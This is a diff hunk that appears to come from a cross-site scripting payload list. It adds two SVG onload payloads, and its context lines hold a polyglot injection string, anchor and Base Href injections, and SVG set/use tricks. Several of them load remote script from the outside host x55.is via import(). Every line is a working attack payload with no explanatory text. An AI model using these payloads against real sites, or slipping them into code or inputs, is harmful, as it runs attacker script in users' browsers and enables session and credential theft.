@@ -2,6 +2,8 @@
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<​/Script/</textArea/</iFrame>\74k<K/contentEditable/autoFocus/OnFocus​=/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
 1'"<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 1'<A/Href="//X55.is/><Base/K='0
+<svg%20onload=%27setTimeout(function()%20{%20alert("\x31");%20},%20100);%27>
+<svg onload='setTimeout(function() { alert("\x31"); }, 100);'>
 <svg><use><set attributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns="http://www.w3.org/2000/svg"&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
 <Base Href=//X55.is>
 "<!--><Svg OnLoad=(confirm)(1)<!--
